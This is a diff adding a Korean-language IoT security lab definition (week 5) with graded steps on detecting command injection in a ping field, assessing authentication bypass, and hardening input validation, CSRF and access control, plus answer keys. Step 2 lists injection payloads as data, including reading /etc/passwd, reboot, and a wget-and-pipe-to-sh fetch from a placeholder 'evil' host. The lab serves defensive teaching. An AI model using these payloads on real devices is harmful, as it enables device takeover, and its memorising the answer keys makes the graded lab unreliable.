@@ -1,0 +1,166 @@
+lab_id: iot-security-week05
+title: "W05 — IoT 웹 인터페이스: 명령 주입·인증 우회·입력검증/CSRF 강화"
+version: ai
+course: iot-security
+week: 5
+description: |
+  IoT 웹 관리 UI 방어. 명령 주입 탐지(CMD_INJECTION), 인증 우회 평가(AUTH_BYPASS), 입력검증·인증·CSRF
+  강화(WEB_HARDENED), 종합(Assessment).
+  IoT 웹은 급조돼 웹 보안이 빠진 경우 많다 — 명령 주입·인증 우회로 완전 장악.
+difficulty: medium
+duration_minutes: 120
+audience: IoT 보안 입문 (5주차)
+prerequisites:
+  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
+  - GPU Ollama 도달 — gemma3:4b
+  - W05 강의안 정독 — §0.5(명령 주입·인증 우회·CSRF)
+objectives:
+  - "GPU 헬스체크(GEN_OK)"
+  - "명령 주입 탐지(CMD_INJECTION)"
+  - "인증 우회 평가(AUTH_BYPASS)"
+  - "입력검증·인증·CSRF 강화(WEB_HARDENED)"
+  - "종합(Assessment)"
+pass_threshold: 0.6
+
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — GPU 헬스체크 → GEN_OK
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
+      ```
+      ✅ 마지막 줄 `GEN_OK`.
+    answer: |
+      ready
+      GEN_OK
+    answer_detail: "GPU 응답 확인."
+    verify:
+      type: output_contains
+      expect: GEN_OK
+      field: stdout
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — 명령 주입 탐지 → CMD_INJECTION
+      > **🎯 목표:** 웹 입력이 셸 명령에 주입되는 취약점을 탐지.
+      > **개념:** ping 테스트 입력에 셸 메타문자를 끼우면 임의 명령.
+      ```bash
+      python3 - <<'PY'
+      import re
+      # 취약한 ping 기능: 입력을 셸에 그대로
+      def vulnerable_ping(host): return f"ping -c1 {host}"   # 검증 없음
+      inputs=["8.8.8.8", "8.8.8.8; reboot", "8.8.8.8 | cat /etc/passwd", "8.8.8.8 && wget http://evil/x.sh|sh"]
+      SHELL_META=re.compile(r"[;&|`$()]|\\n")
+      injections=[]
+      for inp in inputs:
+          cmd=vulnerable_ping(inp)
+          if SHELL_META.search(inp): injections.append(inp); print(f"  INJECTION: '{inp}' -> shell: {cmd}")
+          else: print(f"  benign: '{inp}'")
+      print("CMD_INJECTION" if len(injections)>=3 else "SAFE")
+      PY
+      ```
+      ✅ 마지막 줄 `CMD_INJECTION` (`;`·`|`·`&&`로 reboot·cat passwd·원격 실행 주입).
+      🔎 검증 없이 입력을 셸에 넣으면 셸 메타문자(;|&&)로 임의 명령 실행. IoT의 흔한 치명적 취약점.
+    answer: |
+      benign: '8.8.8.8'
+      INJECTION: '8.8.8.8; reboot' -> shell: ping -c1 8.8.8.8; reboot
+      INJECTION: '8.8.8.8 | cat /etc/passwd' -> shell: ping -c1 8.8.8.8 | cat /etc/passwd
+      INJECTION: '8.8.8.8 && wget http://evil/x.sh|sh' -> shell: ping -c1 8.8.8.8 && wget...
+      CMD_INJECTION
+    answer_detail: "웹 입력의 셸 명령 주입 탐지 → CMD_INJECTION."
+    verify:
+      type: output_contains
+      expect: CMD_INJECTION
+      field: stdout
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — 인증 우회 평가 → AUTH_BYPASS
+      > **🎯 목표:** 기본 자격·약한 세션·인증 없는 API를 평가.
+      > **개념:** 인증이 약하면 그냥 접근.
+      ```bash
+      python3 - <<'PY'
+      # IoT 웹 인증 상태
+      web={"default_creds":True,"session_token":"predictable(seq)","api_auth":False,"access_control":False}
+      bypasses=[]
+      if web["default_creds"]: bypasses.append("default admin/admin login")
+      if "predictable" in web["session_token"]: bypasses.append("predictable session token (hijack)")
+      if not web["api_auth"]: bypasses.append("unauthenticated API endpoints")
+      if not web["access_control"]: bypasses.append("forced browsing (no access control)")
+      for b in bypasses: print("  bypass:", b)
+      print("AUTH_BYPASS" if len(bypasses)>=3 else "SECURE")
+      PY
+      ```
+      ✅ 마지막 줄 `AUTH_BYPASS` (기본 자격+예측 세션+인증없는 API+강제 브라우징).
+      🔎 기본 자격·예측 가능 세션·인증 없는 API·접근 통제 부재 — 각각이 인증 우회 경로.
+    answer: |
+      bypass: default admin/admin login
+      bypass: predictable session token (hijack)
+      bypass: unauthenticated API endpoints
+      bypass: forced browsing (no access control)
+      AUTH_BYPASS
+    answer_detail: "기본 자격·약한 세션·인증없는 API 평가 → AUTH_BYPASS."
+    verify:
+      type: output_contains
+      expect: AUTH_BYPASS
+      field: stdout
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 웹 강화 → WEB_HARDENED
+      > **🎯 목표:** 입력검증·인증·CSRF·접근 통제로 강화.
+      > **개념:** IoT도 웹 보안 기본을 지킨다.
+      ```bash
+      python3 - <<'PY'
+      import re, ipaddress
+      # 입력 검증: IP 형식만 허용(셸 안 씀)
+      def safe_ping(host):
+          try: ipaddress.ip_address(host); return f"ping -c1 {host} (validated, no shell meta)"
+          except ValueError: return "REJECTED (invalid input)"
+      # 인증·CSRF·접근 통제
+      controls={"input_validation":True,"forced_cred_change":True,"csrf_token":True,"api_auth":True,"access_control":True}
+      inj=safe_ping("8.8.8.8; reboot")   # 주입 시도 거부
+      ok=safe_ping("8.8.8.8")             # 정상 통과
+      secured=all(controls.values()) and "REJECTED" in inj and "validated" in ok
+      print("injection attempt:", inj)
+      print("valid IP:", ok)
+      print("controls:", controls)
+      print("WEB_HARDENED" if secured else "CHECK")
+      PY
+      ```
+      ✅ 마지막 줄 `WEB_HARDENED` (입력 검증으로 주입 거부, 인증·CSRF·접근 통제 적용).
+      🔎 입력을 IP 형식으로 엄격 검증(셸 안 씀)+기본 자격 변경+CSRF 토큰+API 인증+접근 통제. 웹 보안 기본.
+    answer: |
+      injection attempt: REJECTED (invalid input)
+      valid IP: ping -c1 8.8.8.8 (validated, no shell meta)
+      controls: {'input_validation': True, 'forced_cred_change': True, 'csrf_token': True, 'api_auth': True, 'access_control': True}
+      WEB_HARDENED
+    answer_detail: "입력검증·인증·CSRF·접근 통제 강화 → WEB_HARDENED."
+    verify:
+      type: output_contains
+      expect: WEB_HARDENED
+      field: stdout
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — 종합 → Assessment
+      ```bash
+      curl -s http://211.170.162.139:10934/api/generate \
+        -d '{"model":"gemma3:4b","prompt":"Write a short note for W05 on IoT web interfaces. Findings: shell metacharacters in a ping field enabled command injection (CMD_INJECTION), default credentials plus weak sessions and unauthenticated APIs enabled auth bypass (AUTH_BYPASS), and strict input validation plus authentication, CSRF tokens, and access control hardened it (WEB_HARDENED). Explain that IoT web UIs are often hastily built with missing web-security basics, so defense applies input validation, strong auth, CSRF protection, and access control. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
+       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
+      ```
+      ✅ 출력에 `Assessment`.
+      🔎 정리: IoT 웹은 급조돼 명령 주입·인증 우회에 취약. 입력검증+강한 인증+CSRF+접근 통제로 방어.
+      다음 주(W06)는 **무선 프로토콜 해킹(Zigbee 등)**.
+    answer: |
+      Assessment
+      IoT web UIs are often hastily built with missing web-security basics, enabling command injection and auth bypass.
+      Defense applies input validation, strong authentication, CSRF tokens, and access control.
+    answer_detail: "W05 IoT 웹 종합(Assessment). 명령 주입·인증 우회·웹 보안 기본."
+    verify:
+      type: output_contains
+      expect: Assessment
+      field: stdout
